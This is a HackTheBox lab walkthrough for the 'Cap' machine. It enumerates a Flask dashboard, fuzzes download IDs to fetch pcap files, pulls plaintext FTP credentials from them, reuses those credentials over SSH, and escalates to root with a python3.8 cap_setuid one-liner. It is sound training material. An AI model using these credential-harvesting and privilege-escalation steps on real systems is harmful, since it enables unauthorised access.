---
render_with_liquid: false
title: HackTheBox Writeup  Cap
date: 2024-10-01 21:23:07 +1400
tags: [hackthebox, nmap, linux, python-flask, pcap, pycredz, discover-secrets, password-reuse, capabilities, gtfobin]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cap]
└─$ pt init '10.10.10.245'
╒═══════════╤═════════════╤══════════════╤══════════╤══════════════╤═══════╕
│ profile   │ lhost       │ rhost        │ domain   │ ip           │ url   │
╞═══════════╪═════════════╪══════════════╪══════════╪══════════════╪═══════╡
│ cap       │ 10.10.14.75 │ 10.10.10.245 │          │ 10.10.10.245 │       │
╘═══════════╧═════════════╧══════════════╧══════════╧══════════════╧═══════╛
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Oct  1 21:23:06 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80, 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-01 21:23:07 CST for 442s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 01 Oct 2024 13:12:08 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 01 Oct 2024 13:12:02 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 01 Oct 2024 13:12:02 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=9%D=10/1%Time=66FBF7C1%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,3012,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Tue,\x2001\x20Oct\x202024\x2013:12:02\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,
SF:\x2001\x20Oct\x202024\x2013:12:02\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x2
SF:0OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Tue,\x2001\x20Oct\x202024\x2013:12:08\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Oct  1 21:30:29 2024 -- 1 IP address (1 host up) scanned in 442.65 seconds
```


## 80 - HTTP : Security Dashboard


### Info

```ruby
http://10.10.10.245 [200] [Security Dashboard] [gunicorn] [a62ecec65d3ba37f3868e21b9716417ddde2ac81] [Bootstrap,Chart.js:2.7.2,Cloudflare,Highcharts,Modernizr,OWL Carousel,Popper,Python,cdnjs,gunicorn,jQuery,metisMenu]
```

![](/assets/obsidian/b29c74f6db95a23d102b8928e16fd79a.png)

# User Flag
---

## Shell as nathan


### 80 - Security Dashboard : FTP credentials in pcap

By heading to http://10.10.10.245/capture, it will be redirected a URL with the format of `http://10.10.10.245/data/<RANDOM_NUMBER>`

![](/assets/obsidian/ed5774533b71bb048564f47d2535d92e.png)

> http://10.10.10.245/data/3

By hitting the download button, it was redirected to `/download/3`

![](/assets/obsidian/3791b8b83a814821cb7bd9821b1461d3.png)

![](/assets/obsidian/f3a7ea681143909673c75761ce6cd78c.png)

By fuzzing the number, I've downloaded some pcap files for analyze

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cap/dump]
└─$ for i in $(seq 0 10); do wget "http://10.10.10.245/download/$i"; done
--2024-10-01 22:13:27--  http://10.10.10.245/download/0
Connecting to 10.10.10.245:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9935 (9.7K) [application/vnd.tcpdump.pcap]
Saving to: ‘0’
[...]

┌──(bravosec㉿fsociety)-[~/htb/Cap/dump]
└─$ file *
0: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
1: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
2: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
3: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
4: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
5: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
6: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
```

There's a pair of FTP credentials from the pcap file with index `0`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cap/dump]
└─$ ~/venv-py3.12/bin/python /opt/sectools/harvesting/PCredz/Pcredz -d . -v
Pcredz 2.0.2
Author: Laurent Gaffie
Please send bugs/comments/pcaps to: laurent.gaffie@gmail.com
This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
FTP, HTTP Basic and credit card data from a given pcap file or from a live interface.

CC number scanning activated


Parsing: ./0
Using Linux Cooked format

protocol: tcp 192.168.196.1:54411 > 192.168.196.16:21
FTP User: nathan
FTP Pass: Buck3tH4TF0RM3!


./0 parsed in: 0.0137 seconds (File size 0.00947 Mo).
[...]
```

### 22 - SSH : Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cap]
└─$ cssh $(pt get rhost) nathan 'Buck3tH4TF0RM3!'
Last login: Tue Oct  1 13:33:20 2024 from 10.10.14.75
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ cat user.txt
a48f4f3fd364603865c638827863ec3d
```

# Root Flag
---

## From nathan to root


### Capabilities - python3.8

```bash
nathan@cap:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null | grep -iE 'cap_sys_admin|cap_sys_ptrace|cap_sys_module|cap_dac_override|cap_chown|cap_former|cap_setuid|cap_setgid|cap_net_raw'
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

> https://gtfobins.github.io/gtfobins/python/#capabilities

```bash
nathan@cap:/var/www/html$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

# cat /root/root.txt
0949e28c3d03e991c417f3140fba9b81
```

# Additional
---
